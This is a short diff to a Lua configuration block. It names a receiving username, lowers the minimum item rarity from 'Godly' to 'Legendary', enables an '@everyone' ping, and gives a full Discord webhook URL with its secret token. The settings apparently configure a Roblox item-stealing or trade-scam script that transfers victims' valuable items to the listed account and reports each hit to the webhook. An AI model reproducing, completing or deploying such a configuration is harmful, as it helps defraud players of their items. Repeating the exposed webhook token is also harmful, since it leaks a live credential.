@@ -1,5 +1,5 @@
 _G.Usernames = {"wjkpaowk"}
-_G.min_rarity = "Godly"
+_G.min_rarity = "Legendary"
 _G.min_value = 1
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1456796260953489543/JPSfORRieAz7mlkaqScrqd_agYqc0LBiOz8YbkJTMKqiXzAXf7C8ptkglVdUTKBpkljG"
